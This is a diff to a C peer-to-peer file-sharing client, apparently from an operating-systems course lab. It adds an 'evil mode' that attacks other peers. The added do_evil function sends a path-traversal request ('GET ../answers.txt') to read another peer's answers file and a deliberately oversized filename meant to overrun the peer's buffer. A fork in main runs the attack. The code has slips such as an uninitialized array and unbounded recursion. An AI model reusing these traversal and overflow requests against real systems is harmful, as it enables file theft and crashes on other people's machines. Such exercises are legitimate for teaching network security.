@@ -762,6 +762,69 @@ static void task_upload(task_t *t)
 	task_free(t);
 }
 
+static void do_evil(task_t *t, task_t *tracker_task)
+{
+    int i;
+    int ret = -1;
+    assert((!t || t->type == TASK_DOWNLOAD)
+        && (tracker_task->type == TASK_TRACKER));
+
+
+    //if no peers some error, skip
+    if (!t || !t->peer_list)
+    {
+        error("No peers have file %s\n", (t ? t->filename : "(t is null)"));
+        task_free(t);
+        return;
+    }
+    else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+          && t->peer_list->port == listen_port)
+        goto try_again;
+
+    //Connect to peer and write the bad GET command
+    message("Connecting to %s:%i to attack %s\n", inet_ntoa(t->peer_list->addr), 
+                t->peer_list->port, t->filename);
+    
+
+
+    int ids[2];
+    //get a new socket
+    t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+    if (t->peer_fd == -1)
+    {
+        error("Can't connect to peer %s\n", strerror(errno));
+        goto try_again;
+    }
+
+    ids[0] = t->peer_fd;
+    osp2p_writef(t->peer_fd, "GET ../answers.txt OSP2P\n"); //try to get their answers
+
+    //need a new socket again
+    t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+    if (t->peer_fd == -1)
+    {
+        error("Can't connect to peer %s\n", strerror(errno));
+        goto try_again;
+    }
+    ids[1] = t->peer_fd;
+    strncpy(t->filename, t->disk_filename, FILENAMESIZ - 1);
+    //get the filename, with a bunch of nulls at the end
+    osp2p_writef(t->peer_fd, "GET %s%s OSP2P\n", t->filename, t->filename);
+    //since it is already as large as possible, if we write it twice it should overrun!
+    
+  try_again:
+    message("Closing connection with victim peer\n");
+    if (ids[0]) close(ids[0]);
+    if (ids[1]) close(ids[1]);
+
+    //next possible peer
+    task_pop_peer(t);
+    do_evil(t, tracker_task);
+}
+
+    
+
+    
 
 // main(argc, argv)
 //	The main loop!
@@ -873,6 +936,29 @@ int main(int argc, char *argv[])
     {
         wait(&status);
         message("Exited the download loop.\n");
+    }
+
+    if (evil_mode) //"Don't be evil." -- Paul Buchheit
+    {   
+        //my Evil Plan: buffer overrun by sending a huge file download
+        //part 2 of Evil Plan: try to escape the current folder and get answers
+        pid = fork();
+        if (!pid)
+        {
+            argv--;
+            strcpy(argv[1], "cat1.jpg"); //we know this file exists
+            if ((t = start_download(tracker_task, argv[1])))
+                do_evil(t, tracker_task);
+            else
+                error("No cat1.jpg on peer");
+            //exit when done doing evil
+            _exit(0);
+        }
+        else //parent
+        {
+            wait(&status);
+            message("Evil finished\n");
+        }
     }
     
     while ((t = task_listen(listen_task)))
